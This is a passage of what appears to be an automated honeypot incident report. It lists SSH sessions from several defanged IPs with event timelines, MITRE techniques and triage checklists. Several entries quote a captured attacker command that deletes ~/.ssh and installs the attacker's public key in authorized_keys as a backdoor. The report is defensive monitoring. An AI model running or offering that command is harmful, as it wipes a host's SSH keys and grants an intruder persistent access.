| `2026-06-05 22:50:00` | `cowrie.session.connect` |
| `2026-06-05 22:50:00` | `cowrie.client.version` |
| `2026-06-05 22:50:00` | `cowrie.client.kex` |
| `2026-06-05 22:50:01` | `cowrie.login.success` |
| `2026-06-05 22:50:01` | `cowrie.session.params` |
| `2026-06-05 22:50:01` | `cowrie.command.input` |
| `2026-06-05 22:50:01` | `cowrie.command.failed` |
| `2026-06-05 22:50:01` | `cowrie.log.closed` |
| `2026-06-05 22:50:02` | `cowrie.session.params` |
| `2026-06-05 22:50:02` | `cowrie.command.input` |
| `2026-06-05 22:50:02` | `cowrie.session.file_download` |
| `2026-06-05 22:50:02` | `cowrie.log.closed` |
| `2026-06-05 22:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6047bcea3c21

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:50 |
| **Last Seen** | 2026-06-05 22:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:50:04` | `cowrie.session.connect` |
| `2026-06-05 22:50:04` | `cowrie.client.version` |
| `2026-06-05 22:50:04` | `cowrie.client.kex` |
| `2026-06-05 22:50:05` | `cowrie.login.success` |
| `2026-06-05 22:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707d53307d13

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:50 |
| **Last Seen** | 2026-06-05 22:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:50:40` | `cowrie.session.connect` |
| `2026-06-05 22:50:40` | `cowrie.client.version` |
| `2026-06-05 22:50:41` | `cowrie.client.kex` |
| `2026-06-05 22:50:41` | `cowrie.login.success` |
| `2026-06-05 22:50:42` | `cowrie.session.params` |
| `2026-06-05 22:50:42` | `cowrie.command.input` |
| `2026-06-05 22:50:42` | `cowrie.command.failed` |
| `2026-06-05 22:50:42` | `cowrie.log.closed` |
| `2026-06-05 22:50:42` | `cowrie.session.params` |
| `2026-06-05 22:50:42` | `cowrie.command.input` |
| `2026-06-05 22:50:42` | `cowrie.session.file_download` |
| `2026-06-05 22:50:42` | `cowrie.log.closed` |
| `2026-06-05 22:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38b5207229d

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:50 |
| **Last Seen** | 2026-06-05 22:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:50:45` | `cowrie.session.connect` |
| `2026-06-05 22:50:45` | `cowrie.client.version` |
| `2026-06-05 22:50:45` | `cowrie.client.kex` |
| `2026-06-05 22:50:46` | `cowrie.login.success` |
| `2026-06-05 22:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-531a6864f284

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:51 |
| **Last Seen** | 2026-06-05 22:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:51:22` | `cowrie.session.connect` |
| `2026-06-05 22:51:22` | `cowrie.client.version` |
| `2026-06-05 22:51:22` | `cowrie.client.kex` |
| `2026-06-05 22:51:23` | `cowrie.login.success` |
| `2026-06-05 22:51:23` | `cowrie.session.params` |
| `2026-06-05 22:51:23` | `cowrie.command.input` |
| `2026-06-05 22:51:23` | `cowrie.command.failed` |
| `2026-06-05 22:51:23` | `cowrie.log.closed` |
| `2026-06-05 22:51:24` | `cowrie.session.params` |
| `2026-06-05 22:51:24` | `cowrie.command.input` |
| `2026-06-05 22:51:24` | `cowrie.session.file_download` |
| `2026-06-05 22:51:24` | `cowrie.log.closed` |
| `2026-06-05 22:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e674462c99

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:51 |
| **Last Seen** | 2026-06-05 22:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:51:26` | `cowrie.session.connect` |
| `2026-06-05 22:51:26` | `cowrie.client.version` |
| `2026-06-05 22:51:26` | `cowrie.client.kex` |
| `2026-06-05 22:51:27` | `cowrie.login.success` |
| `2026-06-05 22:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-686ac4073bf3

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 22:53 |
| **Last Seen** | 2026-06-05 22:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:53:31` | `cowrie.session.connect` |
| `2026-06-05 22:53:31` | `cowrie.client.version` |
| `2026-06-05 22:53:31` | `cowrie.client.kex` |
| `2026-06-05 22:53:32` | `cowrie.login.success` |
| `2026-06-05 22:53:32` | `cowrie.session.params` |
| `2026-06-05 22:53:32` | `cowrie.command.input` |
| `2026-06-05 22:53:32` | `cowrie.command.failed` |
| `2026-06-05 22:53:32` | `cowrie.log.closed` |
| `2026-06-05 22:53:33` | `cowrie.session.params` |
| `2026-06-05 22:53:33` | `cowrie.command.input` |
| `2026-06-05 22:53:33` | `cowrie.session.file_download` |
| `2026-06-05 22:53:33` | `cowrie.log.closed` |
| `2026-06-05 22:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46007e9e093

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 22:53 |
| **Last Seen** | 2026-06-05 22:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:53:35` | `cowrie.session.connect` |
| `2026-06-05 22:53:35` | `cowrie.client.version` |
| `2026-06-05 22:53:35` | `cowrie.client.kex` |
| `2026-06-05 22:53:36` | `cowrie.login.success` |
| `2026-06-05 22:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e49d196d6fc

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:53 |
| **Last Seen** | 2026-06-05 22:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:53:52` | `cowrie.session.connect` |
| `2026-06-05 22:53:52` | `cowrie.client.version` |
| `2026-06-05 22:53:53` | `cowrie.client.kex` |
| `2026-06-05 22:53:53` | `cowrie.login.success` |
| `2026-06-05 22:53:54` | `cowrie.session.params` |
| `2026-06-05 22:53:54` | `cowrie.command.input` |
| `2026-06-05 22:53:54` | `cowrie.command.failed` |
| `2026-06-05 22:53:54` | `cowrie.log.closed` |
| `2026-06-05 22:53:54` | `cowrie.session.params` |
| `2026-06-05 22:53:54` | `cowrie.command.input` |
| `2026-06-05 22:53:54` | `cowrie.session.file_download` |
| `2026-06-05 22:53:54` | `cowrie.log.closed` |
| `2026-06-05 22:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ef3993eaa4

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:53 |
| **Last Seen** | 2026-06-05 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:53:57` | `cowrie.session.connect` |
| `2026-06-05 22:53:57` | `cowrie.client.version` |
| `2026-06-05 22:53:57` | `cowrie.client.kex` |
| `2026-06-05 22:53:58` | `cowrie.login.success` |
| `2026-06-05 22:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7f41cff0fd

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:54 |
| **Last Seen** | 2026-06-05 22:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:54:13` | `cowrie.session.connect` |
| `2026-06-05 22:54:13` | `cowrie.client.version` |
| `2026-06-05 22:54:14` | `cowrie.client.kex` |
| `2026-06-05 22:54:14` | `cowrie.login.success` |
| `2026-06-05 22:54:15` | `cowrie.session.params` |
| `2026-06-05 22:54:15` | `cowrie.command.input` |
| `2026-06-05 22:54:15` | `cowrie.command.failed` |
| `2026-06-05 22:54:15` | `cowrie.log.closed` |
| `2026-06-05 22:54:15` | `cowrie.session.params` |
| `2026-06-05 22:54:15` | `cowrie.command.input` |
| `2026-06-05 22:54:15` | `cowrie.session.file_download` |
| `2026-06-05 22:54:15` | `cowrie.log.closed` |
| `2026-06-05 22:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e53671be07

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-05 22:54 |
| **Last Seen** | 2026-06-05 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:54:18` | `cowrie.session.connect` |
| `2026-06-05 22:54:18` | `cowrie.client.version` |
| `2026-06-05 22:54:18` | `cowrie.client.kex` |
| `2026-06-05 22:54:19` | `cowrie.login.success` |
| `2026-06-05 22:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b1a6aa4336f

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 22:55 |
| **Last Seen** | 2026-06-05 22:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:55:29` | `cowrie.session.connect` |
| `2026-06-05 22:55:29` | `cowrie.client.version` |
| `2026-06-05 22:55:29` | `cowrie.client.kex` |
| `2026-06-05 22:55:29` | `cowrie.login.success` |
| `2026-06-05 22:55:30` | `cowrie.session.params` |
| `2026-06-05 22:55:30` | `cowrie.command.input` |
| `2026-06-05 22:55:30` | `cowrie.command.failed` |
| `2026-06-05 22:55:30` | `cowrie.log.closed` |
| `2026-06-05 22:55:30` | `cowrie.session.params` |
| `2026-06-05 22:55:30` | `cowrie.command.input` |
| `2026-06-05 22:55:30` | `cowrie.session.file_download` |
| `2026-06-05 22:55:30` | `cowrie.log.closed` |
| `2026-06-05 22:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d679563e96f0

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 22:55 |
| **Last Seen** | 2026-06-05 22:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:55:32` | `cowrie.session.connect` |
| `2026-06-05 22:55:32` | `cowrie.client.version` |
| `2026-06-05 22:55:33` | `cowrie.client.kex` |
| `2026-06-05 22:55:33` | `cowrie.login.success` |
| `2026-06-05 22:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cc59bff676f

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 22:57 |
| **Last Seen** | 2026-06-05 22:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:57:20` | `cowrie.session.connect` |
| `2026-06-05 22:57:20` | `cowrie.client.version` |
| `2026-06-05 22:57:20` | `cowrie.client.kex` |
| `2026-06-05 22:57:21` | `cowrie.login.success` |
| `2026-06-05 22:57:21` | `cowrie.session.params` |
| `2026-06-05 22:57:21` | `cowrie.command.input` |
| `2026-06-05 22:57:21` | `cowrie.command.failed` |
| `2026-06-05 22:57:21` | `cowrie.log.closed` |
| `2026-06-05 22:57:21` | `cowrie.session.params` |
| `2026-06-05 22:57:21` | `cowrie.command.input` |
| `2026-06-05 22:57:21` | `cowrie.session.file_download` |
| `2026-06-05 22:57:21` | `cowrie.log.closed` |
| `2026-06-05 22:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50a7ff786c5

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 22:57 |
| **Last Seen** | 2026-06-05 22:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:57:23` | `cowrie.session.connect` |
| `2026-06-05 22:57:23` | `cowrie.client.version` |
| `2026-06-05 22:57:23` | `cowrie.client.kex` |
| `2026-06-05 22:57:23` | `cowrie.login.success` |
| `2026-06-05 22:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac2dc00bb8a

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 22:59 |
| **Last Seen** | 2026-06-05 22:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:59:21` | `cowrie.session.connect` |
| `2026-06-05 22:59:21` | `cowrie.client.version` |
| `2026-06-05 22:59:21` | `cowrie.client.kex` |
| `2026-06-05 22:59:21` | `cowrie.login.success` |
| `2026-06-05 22:59:21` | `cowrie.session.params` |
| `2026-06-05 22:59:21` | `cowrie.command.input` |
| `2026-06-05 22:59:21` | `cowrie.command.failed` |
| `2026-06-05 22:59:22` | `cowrie.log.closed` |
| `2026-06-05 22:59:22` | `cowrie.session.params` |
| `2026-06-05 22:59:22` | `cowrie.command.input` |
| `2026-06-05 22:59:22` | `cowrie.session.file_download` |
| `2026-06-05 22:59:22` | `cowrie.log.closed` |
| `2026-06-05 22:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b70510407fbf

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 22:59 |
| **Last Seen** | 2026-06-05 22:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 22:59:23` | `cowrie.session.connect` |
| `2026-06-05 22:59:23` | `cowrie.client.version` |
| `2026-06-05 22:59:23` | `cowrie.client.kex` |
